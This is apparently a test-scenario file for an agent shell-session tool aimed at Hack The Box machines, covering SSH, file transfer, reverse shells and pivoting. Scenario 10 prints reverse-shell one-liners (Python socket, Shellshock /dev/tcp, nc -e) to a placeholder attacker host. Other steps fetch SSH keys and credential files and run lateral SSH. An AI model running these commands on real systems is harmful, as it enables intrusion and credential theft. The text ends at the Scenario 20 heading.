@@ -1,0 +1,1326 @@
+# Integration Scenarios: shell-session
+# Required: HTB VPN connection, target box with SSH access or exploitable services
+# Suitable HTB Machines:
+#   SSH-based:
+#   - Lame (easy, SMB -> Samba 3.0.20 RCE gives root shell, SSH on port 22)
+#   - Bashed (easy, webshell at /dev, can SSH after cred discovery)
+#   - Shocker (easy, Shellshock -> www-data -> SSH with found creds)
+#   - Irked (easy, UnrealIRCd backdoor -> user shell, SSH with found creds)
+#   Reverse-shell-based:
+#   - Lame (easy, Samba RCE -> reverse shell)
+#   - Bashed (easy, phpbash -> Python reverse shell)
+#   - Nibbles (easy, Nibbleblog upload -> reverse shell)
+#   - Shocker (easy, Shellshock -> reverse shell)
+#   - Precious (easy, Ruby PDFKit -> reverse shell)
+# Prerequisites: VPN connected, target IP reachable, attacker IP known (tun0)
+# Recommended FIRST box: Shocker (easy Linux, exercises SSH connect + exec + upload +
+#   download lifecycle, has Shellshock for reverse shell scenarios, both www-data and
+#   root available for privilege escalation testing)
+# Run with: pytest tests/tools/test_shell_session.py --tool=shell-session -v
+#
+# Data source: Trajectory analysis of 411 real shell-session calls across 23 HTB
+#   engagements.
+#   Method calls: exec=346, ssh_connect=34, upload=18, close=8, download=4,
+#     list_sessions=1, listen=0, shell_exec=0, upgrade_shell=0
+#   Error data: 26 exec timeouts (8%), 14 ssh_connect timeouts (41% of connects),
+#     14 session-not-found on exec, 12 permission denied, 7 command-not-found,
+#     3 restricted shell (rbash), 1 invalid SSH key format
+#   Duration stats: exec avg=10.4s p50=0.8s max=601s; ssh_connect avg=191s p50=10s
+#     max=715s (timeout bug: paramiko timeout ignored, actual duration 10-20x requested)
+#   Lifecycle patterns: Most engagements never call close (sessions left dangling),
+#     one engagement had 4 reconnects across 80 calls, nohup/timeout wrapping used
+#     26 times for long-running commands
+
+# ===============================================================================
+# TEST EXECUTION LOG
+# ===============================================================================
+# (append results here as scenarios are tested)
+
+# ===============================================================================
+# SSH SESSION LIFECYCLE
+# Scenarios 1-6: Full SSH lifecycle from connect through cleanup
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 1: SSH Connect - Password Authentication
+# Goal: Establish SSH session with password, verify session metadata
+# Target: Any Linux HTB box with valid SSH credentials (Lame, Shocker, Irked)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Connect with password
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>, port: 22, timeout: 30}
+Expected: success=true, session_id starts with "ses_", sftp_available=true, attempts=1
+Notes: Foundation for all subsequent SSH scenarios. Banner may be empty.
+
+## Step 2: Verify session metadata
+Method: list_sessions
+Args: {}
+Expected: success=true, total >= 1, sessions[0].type="ssh", sessions[0].host=<TARGET>,
+  sessions[0].username=<USER>, sessions[0].uptime_seconds >= 0
+
+## Step 3: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true, type="ssh"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 2: SSH Connect - Private Key Authentication
+# Goal: Test key-based SSH auth (common after finding SSH keys on target)
+# Target: Any box where you've found an SSH private key
+# Suitable: Irked (steg -> SSH key), Valentine (Heartbleed -> SSH key)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Connect with RSA private key
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, private_key: <BASE64_ENCODED_RSA_KEY>, port: 22}
+Expected: success=true, session_id returned, attempts=1
+Notes: Key must be base64-encoded. Get it with: base64 -w0 id_rsa
+
+## Step 2: Verify identity
+Method: exec
+Args: {session_id: <from step 1>, command: "id && whoami", timeout: 10}
+Expected: success=true, stdout confirms expected user
+
+## Step 3: Connect with Ed25519 key (if available)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, private_key: <BASE64_ENCODED_ED25519_KEY>}
+Expected: success=true, session_id returned
+Notes: Tests the Ed25519 key type fallback path in _ssh_connect_sync.
+
+## Step 4: Clean up both sessions
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+Method: close
+Args: {session_id: <from step 3>}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 3: SSH Connect - Non-Default Port
+# Goal: SSH to a service running on a non-standard port
+# Target: Boxes with SSH on alternate ports (some HTB boxes move SSH to 2222, etc.)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Connect to non-default port
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>, port: <NON_DEFAULT_PORT>, timeout: 30}
+Expected: success=true, port=<NON_DEFAULT_PORT> in result
+Notes: One engagement used non-default port. Tests the port parameter routing.
+
+## Step 2: Verify connection
+Method: exec
+Args: {session_id: <from step 1>, command: "echo connected_on_port_$SSH_CONNECTION", timeout: 10}
+Expected: success=true
+
+## Step 3: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 4: Exec - Basic Command Execution
+# Goal: Run a variety of command types and verify output parsing
+# Target: Any Linux HTB box with SSH access
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Basic identity enumeration
+Method: exec
+Args: {session_id: <from step 1>, command: "id && hostname && uname -a", timeout: 30}
+Expected: success=true, exit_code=0, stdout contains "uid=" and kernel version
+Notes: First command on session. Verifies the session is functional.
+
+## Step 3: Read /etc/passwd (always present)
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/passwd", timeout: 30}
+Expected: success=true, exit_code=0, stdout contains "root:x:0:0:"
+
+## Step 4: Multi-line piped command
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/passwd | grep -v nologin | awk -F: '{print $1, $6}'", timeout: 15}
+Expected: success=true, exit_code=0, stdout contains "root /root"
+
+## Step 5: Command with non-zero exit code (not a tool error)
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /nonexistent/file 2>&1", timeout: 10}
+Expected: success=true, exit_code != 0, stderr or stdout contains "No such file"
+Notes: Non-zero exit code is NOT a tool error per server design. The agent decides.
+
+## Step 6: Command producing stderr alongside stdout
+Method: exec
+Args: {session_id: <from step 1>, command: "ls /root /nonexistent 2>&1", timeout: 10}
+Expected: success=true, stdout contains both directory listing and error message
+
+## Step 7: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 5: Exec - get_pty for Interactive Commands
+# Goal: Test PTY allocation for commands that require a terminal
+# Target: Any Linux HTB box with SSH access and sudo configured
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: sudo -l without PTY (may fail or show limited output)
+Method: exec
+Args: {session_id: <from step 1>, command: "sudo -l 2>&1", timeout: 15}
+Expected: success=true, stdout may contain "a terminal is required" or sudo listing
+Notes: Observed in engagements: "sudo: a terminal is required to read the password"
+
+## Step 3: sudo -l with PTY
+Method: exec
+Args: {session_id: <from step 1>, command: "sudo -l 2>&1", timeout: 15, get_pty: true}
+Expected: success=true, stdout contains sudo privileges or password prompt
+Notes: get_pty=true was used 3 times in engagement data, always for sudo or nested SSH.
+
+## Step 4: Nested SSH with PTY
+Method: exec
+Args: {session_id: <from step 1>, command: "sshpass -p '<PASS2>' ssh -o StrictHostKeyChecking=no <USER2>@<INTERNAL_HOST> 'id'", timeout: 30, get_pty: true}
+Expected: success=true, stdout contains "uid=" from internal host
+Notes: Engagement data shows get_pty used for nested SSH. Requires sshpass installed.
+
+## Step 5: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 6: Exec - Long-Running Commands and Timeout Handling
+# Goal: Exercise timeout behavior with long-running commands
+# Target: Any Linux HTB box with SSH access
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Short command completes fast
+Method: exec
+Args: {session_id: <from step 1>, command: "echo hello", timeout: 5}
+Expected: success=true, exit_code=0, timed_out=false, stdout="hello\n"
+Notes: Baseline — ensures timeout path is not triggered for fast commands.
+
+## Step 3: Command that will timeout
+Method: exec
+Args: {session_id: <from step 1>, command: "sleep 60", timeout: 3}
+Expected: success=false, error_class="timeout", retryable=true, timed_out=true
+Notes: Verifies timeout detection. Session should remain valid after timeout.
+
+## Step 4: Session still works after timeout
+Method: exec
+Args: {session_id: <from step 1>, command: "echo still_alive", timeout: 10}
+Expected: success=true, stdout contains "still_alive"
+Notes: CRITICAL: Validates session persistence after timeout. In engagement data,
+  26 exec calls timed out but subsequent commands on the same session worked.
+
+## Step 5: nohup wrapper for long commands (engagement pattern)
+Method: exec
+Args: {session_id: <from step 1>, command: "nohup bash -c 'sleep 5 && echo DONE > /tmp/test_nohup.txt' &", timeout: 10}
+Expected: success=true, exit_code=0
+Notes: 26 engagement calls used nohup/timeout wrapping for long-running scripts.
+  Agent pattern: run in background, poll results later.
+
+## Step 6: Check nohup result after delay
+Method: exec
+Args: {session_id: <from step 1>, command: "sleep 6 && cat /tmp/test_nohup.txt", timeout: 15}
+Expected: success=true, stdout contains "DONE"
+
+## Step 7: timeout wrapper (engagement pattern)
+Method: exec
+Args: {session_id: <from step 1>, command: "timeout 5 ping -c 100 127.0.0.1 | tail -3", timeout: 10}
+Expected: success=true, exit_code=124 (timeout exit code), stdout contains "packets transmitted"
+Notes: Engagement data shows "timeout N command" as common pattern to cap long commands.
+
+## Step 8: Clean up
+Method: exec
+Args: {session_id: <from step 1>, command: "rm -f /tmp/test_nohup.txt", timeout: 5}
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+
+# ===============================================================================
+# FILE TRANSFER
+# Scenarios 7-9: Upload and download via SFTP and fallback
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 7: Upload - Text and Binary Files via SFTP
+# Goal: Upload files with different content types and permissions
+# Target: Any Linux HTB box with SSH access and SFTP available
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session (verify SFTP available)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true, sftp_available=true
+
+## Step 2: Upload text script
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: "#!/bin/bash\necho 'uploaded_successfully'\nid\nhostname",
+  remote_path: "/tmp/test_upload.sh",
+  mode: "0755"
+}
+Expected: success=true, size > 50, remote_path="/tmp/test_upload.sh"
+
+## Step 3: Verify uploaded file works
+Method: exec
+Args: {session_id: <from step 1>, command: "/tmp/test_upload.sh", timeout: 10}
+Expected: success=true, stdout contains "uploaded_successfully"
+
+## Step 4: Upload with base64 encoding (for binary content)
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: "SGVsbG8gV29ybGQK",
+  remote_path: "/tmp/test_b64.txt",
+  mode: "0644",
+  is_base64: true
+}
+Expected: success=true, size=12 (decoded "Hello World\n")
+
+## Step 5: Verify base64 upload
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /tmp/test_b64.txt", timeout: 10}
+Expected: success=true, stdout="Hello World\n"
+
+## Step 6: Upload large file (LinPEAS-sized)
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: <linpeas.sh content or base64>,
+  remote_path: "/tmp/linpeas.sh",
+  mode: "0755"
+}
+Expected: success=true, size > 100000 (linpeas is ~800KB)
+Notes: 18 uploads in engagement data. Tests large file transfer reliability.
+
+## Step 7: Clean up
+Method: exec
+Args: {session_id: <from step 1>, command: "rm -f /tmp/test_upload.sh /tmp/test_b64.txt /tmp/linpeas.sh", timeout: 10}
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 8: Upload - Fallback Without SFTP
+# Goal: Test the base64 echo fallback when SFTP is not available
+# Target: Box where SFTP subsystem is disabled or restricted shell
+# Note: This scenario is harder to set up — requires a target without SFTP.
+#   Can be simulated by testing the fallback logic path.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session (assume sftp_available=false)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true, sftp_available=false
+Notes: If SFTP is available, this scenario cannot be naturally tested on this target.
+  Look for containers or chroot environments that disable SFTP.
+
+## Step 2: Upload via echo+base64 fallback
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: "#!/bin/bash\necho fallback_upload_works",
+  remote_path: "/tmp/fallback_test.sh",
+  mode: "0755"
+}
+Expected: success=true
+Notes: Server falls back to: echo '<b64>' | base64 -d > path && chmod mode path
+
+## Step 3: Verify fallback upload
+Method: exec
+Args: {session_id: <from step 1>, command: "/tmp/fallback_test.sh", timeout: 10}
+Expected: success=true, stdout contains "fallback_upload_works"
+
+## Step 4: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 9: Download - Files and Error Handling
+# Goal: Download files via SFTP, test nonexistent file error, base64 mode
+# Target: Any Linux HTB box with SSH access
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Download text file
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/etc/hostname"}
+Expected: success=true, content is the hostname, is_base64=false, size > 0
+
+## Step 3: Download flag file
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/home/<USER>/user.txt"}
+Expected: success=true, content is 32-char hex hash, size=33 (32 + newline)
+Notes: 4 downloads in engagement data — all flag or config file retrievals.
+
+## Step 4: Download as base64 (for binary files)
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/etc/hostname", as_base64: true}
+Expected: success=true, is_base64=true, content is base64-encoded
+
+## Step 5: Download SSH private key (if exists)
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/home/<USER>/.ssh/id_rsa"}
+Expected: success=true, content starts with "-----BEGIN"
+  OR success=false (FileNotFoundError) if no key file
+
+## Step 6: Download nonexistent file
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/root/this_does_not_exist_xyzzy"}
+Expected: success=false, error contains "not found" or "No such file"
+
+## Step 7: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ===============================================================================
+# REVERSE SHELL HANDLING
+# Scenarios 10-14: Listen, shell_exec, upgrade_shell lifecycle
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 10: Reverse Shell - Full Lifecycle (listen -> shell_exec -> upgrade)
+# Goal: Catch a reverse shell, execute commands, upgrade to PTY
+# Target: Any Linux HTB box with RCE (Lame, Bashed, Nibbles, Shocker, Precious)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start reverse shell listener
+Method: listen
+Args: {port: 4444, timeout: 300}
+Expected: Blocks until connection. On success: session_id, remote_ip=<TARGET>, initial_output
+Notes: Trigger the reverse shell from another tool while this blocks.
+  Trigger examples:
+    Bashed: From phpbash: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+    Shocker: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/4444 0>&1' http://<TARGET>/cgi-bin/user.sh
+    Nibbles: Upload reverse shell PHP to nibbleblog, navigate to trigger
+    Lame: smbclient exploit with payload: `/=`nohup nc -e /bin/sh <LHOST> 4444`
+
+## Step 2: Execute commands on reverse shell (dumb shell)
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "id", timeout: 30}
+Expected: success=true, output contains "uid=" (e.g., "uid=33(www-data)")
+Notes: Output stability detection waits for shell prompt before returning.
+  shell_exec had 0 calls in engagement data — agents used netcat instead.
+
+## Step 3: Enumerate as initial user
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "whoami && pwd && cat /etc/os-release", timeout: 30}
+Expected: success=true, output contains username, working directory, OS info
+
+## Step 4: Check what upgrade methods are available
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "which python3 python script 2>/dev/null", timeout: 10}
+Expected: success=true, output lists available interpreters
+
+## Step 5: Upgrade shell to PTY
+Method: upgrade_shell
+Args: {session_id: <from step 1>}
+Expected: success=true if python3 available, upgrade_method contains "pty.spawn"
+  OR success=false if python3/python/script not available
+Notes: Server tries: python3 pty.spawn -> python pty.spawn -> script -qc /bin/bash
+
+## Step 6: Test PTY features (post-upgrade)
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "sudo -l", timeout: 30}
+Expected: success=true, output contains sudo rules or "password is required"
+Notes: Only works after upgrade_shell. Without PTY, sudo fails with no output.
+
+## Step 7: SUID binary enumeration (post-upgrade)
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "find / -perm -4000 2>/dev/null", timeout: 60}
+Expected: success=true, output lists SUID binaries (e.g., /usr/bin/passwd)
+
+## Step 8: Grab user flag
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "cat /home/*/user.txt 2>/dev/null || echo NO_FLAG", timeout: 10}
+Expected: success=true, output contains 32-char hex hash or "NO_FLAG"
+
+## Step 9: Close reverse shell session
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true, type="reverse_shell"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 11: Reverse Shell - Output Stability Detection
+# Goal: Verify the output stability detection mechanism with various output patterns
+# Target: Any Linux HTB box with RCE
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Catch reverse shell
+Method: listen
+Args: {port: 4445, timeout: 300}
+Expected: success=true, session_id returned
+
+## Step 2: Fast command (should return quickly via prompt detection)
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "echo FAST_RESPONSE", timeout: 30}
+Expected: success=true, output contains "FAST_RESPONSE"
+Notes: Prompt detection should trigger early exit from _read_until_stable.
+
+## Step 3: Command with slow/streaming output
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "for i in $(seq 1 5); do echo line_$i; sleep 1; done", timeout: 30}
+Expected: success=true, output contains "line_1" through "line_5"
+Notes: Tests stability_window detection — output pauses between lines.
+
+## Step 4: Command with large output
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "cat /etc/passwd", timeout: 15}
+Expected: success=true, output contains "root:" and multiple user entries
+
+## Step 5: Command that produces no output
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "true", timeout: 10}
+Expected: success=true, output is empty or just a prompt
+Notes: Tests the stability_window timeout path (no data, just waits for window).
+
+## Step 6: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 12: Reverse Shell - Upgrade Failure Paths
+# Goal: Test upgrade_shell when different interpreters are/aren't available
+# Target: Minimal container or box without Python installed
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Catch reverse shell
+Method: listen
+Args: {port: 4446, timeout: 300}
+Expected: success=true
+
+## Step 2: Verify no python3 available (if testing failure path)
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "which python3 python script 2>/dev/null || echo NO_UPGRADE_TOOLS", timeout: 10}
+Expected: success=true, output contains "NO_UPGRADE_TOOLS"
+Notes: If tools ARE available, upgrade will succeed and this becomes a success test.
+
+## Step 3: Attempt upgrade (expect failure on minimal systems)
+Method: upgrade_shell
+Args: {session_id: <from step 1>}
+Expected: success=false, error contains "python and script not available"
+  OR success=true if an interpreter is found (test adapts to target)
+Notes: Server tries python3 -> python -> script in sequence.
+
+## Step 4: Verify shell still works after failed upgrade
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "echo still_functional", timeout: 10}
+Expected: success=true, output contains "still_functional"
+Notes: Failed upgrade should not break the existing dumb shell.
+
+## Step 5: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 13: Reverse Shell - Command Echo Stripping
+# Goal: Verify that the echoed command is stripped from shell_exec output
+# Target: Any Linux HTB box with RCE
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Catch reverse shell
+Method: listen
+Args: {port: 4447, timeout: 300}
+Expected: success=true
+
+## Step 2: Run a command and check echo stripping
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "echo UNIQUE_MARKER_12345", timeout: 15}
+Expected: success=true, output contains "UNIQUE_MARKER_12345"
+  Output should NOT start with "echo UNIQUE_MARKER_12345" (the echoed command)
+Notes: Server logic: if lines[0] contains the command, strip it from output.
+
+## Step 3: Run command with special characters
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "echo 'single quotes' && echo \"double quotes\"", timeout: 15}
+Expected: success=true, output contains "single quotes" and "double quotes"
+Notes: Tests echo stripping with complex command strings.
+
+## Step 4: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 14: Reverse Shell - Timeout on shell_exec
+# Goal: Verify timeout behavior on reverse shell commands
+# Target: Any Linux HTB box with RCE
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Catch reverse shell
+Method: listen
+Args: {port: 4448, timeout: 300}
+Expected: success=true
+
+## Step 2: Command that exceeds timeout
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "sleep 60", timeout: 5}
+Expected: success=true (shell_exec doesn't have error_class="timeout" path),
+  output contains "[TIMEOUT]"
+Notes: Unlike exec (SSH), shell_exec uses _read_until_stable which appends
+  "[TIMEOUT]" to output but returns success=true. Different timeout semantics.
+
+## Step 3: Shell still works after timeout
+Method: shell_exec
+Args: {session_id: <from step 1>, command: "echo recovered", timeout: 15}
+Expected: success=true, output contains "recovered"
+Notes: Verifies the shell is not corrupted after a timeout.
+
+## Step 4: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ===============================================================================
+# SESSION MANAGEMENT
+# Scenarios 15-18: Multi-session, list_sessions, lifecycle
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 15: Concurrent SSH Sessions (Multi-Target)
+# Goal: Manage multiple simultaneous SSH sessions to different targets
+# Target: Two or more HTB boxes (any combination)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Connect to target 1
+Method: ssh_connect
+Args: {host: <TARGET1>, username: <USER1>, password: <PASS1>}
+Expected: success=true, session_id returned as sid1
+
+## Step 2: Connect to target 2
+Method: ssh_connect
+Args: {host: <TARGET2>, username: <USER2>, password: <PASS2>}
+Expected: success=true, session_id returned as sid2, different from sid1
+
+## Step 3: List sessions shows both
+Method: list_sessions
+Args: {}
+Expected: success=true, total >= 2, sessions contains both sid1 and sid2
+  Each session has: id, type="ssh", host, port, username, connected_at, uptime_seconds
+
+## Step 4: Execute on each independently
+Method: exec
+Args: {session_id: sid1, command: "hostname"}
+Expected: success=true, stdout is target1's hostname
+Method: exec
+Args: {session_id: sid2, command: "hostname"}
+Expected: success=true, stdout is target2's hostname (different from target1)
+
+## Step 5: Close one, other survives
+Method: close
+Args: {session_id: sid1}
+Expected: success=true
+Method: exec
+Args: {session_id: sid2, command: "echo still_alive"}
+Expected: success=true, stdout contains "still_alive"
+
+## Step 6: Verify list_sessions reflects closure
+Method: list_sessions
+Args: {}
+Expected: success=true, total=1, sessions contains only sid2
+
+## Step 7: Clean up remaining
+Method: close
+Args: {session_id: sid2}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 16: Mixed Session Types (SSH + Reverse Shell)
+# Goal: Manage SSH and reverse shell sessions simultaneously
+# Target: Box with both SSH access and RCE vulnerability
+# Suitable: Shocker (SSH creds + Shellshock RCE)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish SSH session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true, sid_ssh returned
+
+## Step 2: Catch reverse shell (trigger from separate tool)
+Method: listen
+Args: {port: 4449, timeout: 300}
+Expected: success=true, sid_revshell returned
+
+## Step 3: List sessions shows both types
+Method: list_sessions
+Args: {}
+Expected: success=true, total >= 2,
+  one session with type="ssh", one with type="reverse_shell"
+
+## Step 4: Execute on SSH session
+Method: exec
+Args: {session_id: sid_ssh, command: "echo ssh_session", timeout: 10}
+Expected: success=true, stdout contains "ssh_session"
+
+## Step 5: Execute on reverse shell
+Method: shell_exec
+Args: {session_id: sid_revshell, command: "echo revshell_session", timeout: 10}
+Expected: success=true, output contains "revshell_session"
+
+## Step 6: Close reverse shell, SSH survives
+Method: close
+Args: {session_id: sid_revshell}
+Expected: success=true, type="reverse_shell"
+Method: exec
+Args: {session_id: sid_ssh, command: "echo ssh_still_alive", timeout: 10}
+Expected: success=true
+
+## Step 7: Clean up SSH
+Method: close
+Args: {session_id: sid_ssh}
+Expected: success=true, type="ssh"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 17: Session Reconnection After Loss
+# Goal: Handle session loss and reconnection (engagement pattern)
+# Target: Any Linux HTB box with SSH access
+# Notes: One engagement had 4 reconnects across 80 calls. Most engagements
+#   never explicitly close sessions (8 close calls across 411 total).
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true, session_id returned as sid1
+
+## Step 2: Use session
+Method: exec
+Args: {session_id: sid1, command: "echo session_active", timeout: 10}
+Expected: success=true
+
+## Step 3: Close session (simulating connection loss)
+Method: close
+Args: {session_id: sid1}
+Expected: success=true
+
+## Step 4: Attempt to use closed session
+Method: exec
+Args: {session_id: sid1, command: "echo should_fail", timeout: 10}
+Expected: success=false, error contains "not found", error_class="params"
+Notes: 14 session-not-found errors on exec in engagement data. This is the most
+  common error pattern — agent tries to use a session that no longer exists.
+
+## Step 5: Reconnect (new session)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true, session_id returned as sid2 (different from sid1)
+
+## Step 6: Verify new session works
+Method: exec
+Args: {session_id: sid2, command: "echo reconnected", timeout: 10}
+Expected: success=true, stdout contains "reconnected"
+
+## Step 7: Clean up
+Method: close
+Args: {session_id: sid2}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 18: Session Persistence Under Load
+# Goal: Verify session survives many sequential commands without degradation
+# Target: Any Linux HTB box with SSH access
+# Notes: Top engagement had 74 exec calls on a single session with 0 closes.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Run 10 rapid-fire commands
+Method: exec
+Args: {session_id: <from step 1>, command: "echo cmd_1", timeout: 10}
+Expected: success=true
+Method: exec
+Args: {session_id: <from step 1>, command: "echo cmd_2", timeout: 10}
+Expected: success=true
+...repeat through cmd_10...
+Notes: Tests that session handles many sequential exec_command calls.
+
+## Step 3: Verify session metadata still accurate
+Method: list_sessions
+Args: {}
+Expected: success=true, uptime_seconds > 0, session still listed
+
+## Step 4: Run a heavy command after many light ones
+Method: exec
+Args: {session_id: <from step 1>, command: "find / -name '*.conf' 2>/dev/null | head -50", timeout: 30}
+Expected: success=true, stdout lists config files
+
+## Step 5: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true
+
+# ===============================================================================
+# PIVOT / LATERAL MOVEMENT
+# Scenarios 19-20: Using SSH sessions as pivot points
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 19: Pivot Through Compromised Box
+# Goal: SSH to first box, use it to reach internal targets
+# Target: Multi-host HTB environments or boxes with lateral movement
+# Suitable: Any box where you can establish SSH and reach other internal hosts
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: SSH to jump box
+Method: ssh_connect
+Args: {host: <TARGET1>, username: <USER1>, password: <PASS1>, port: 22}
+Expected: success=true, session_id returned
+
+## Step 2: Discover internal hosts
+Method: exec
+Args: {session_id: <from step 1>, command: "ip addr show && arp -a && cat /etc/hosts", timeout: 30}
+Expected: success=true, stdout shows network interfaces and known hosts
+Notes: Look for internal ranges (172.16.x.x, 10.x.x.x, 192.168.x.x)
+
+## Step 3: Port scan internal host from jump box
+Method: exec
+Args: {session_id: <from step 1>, command: "for p in 22 80 443 445 3306 8080; do (echo >/dev/tcp/<TARGET2>/$p) 2>/dev/null && echo \"Port $p open\"; done", timeout: 30}
+Expected: success=true, stdout lists open ports on internal target
+
+## Step 4: Nested SSH to internal target
+Method: exec
+Args: {session_id: <from step 1>, command: "sshpass -p '<PASS2>' ssh -o StrictHostKeyChecking=no <USER2>@<TARGET2> 'id && cat /root/root.txt'", timeout: 30, get_pty: true}
+Expected: success=true, stdout contains uid= and possibly the root flag
+Notes: Uses get_pty=true because SSH needs a terminal.
+
+## Step 5: Upload pivot tool to jump box
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: <chisel binary base64>,
+  remote_path: "/tmp/chisel",
+  mode: "0755",
+  is_base64: true
+}
+Expected: success=true
+
+## Step 6: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+Expected: success=true, type="ssh"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 20: Upload and Execute Enumeration Tool (Full Pentest Workflow)
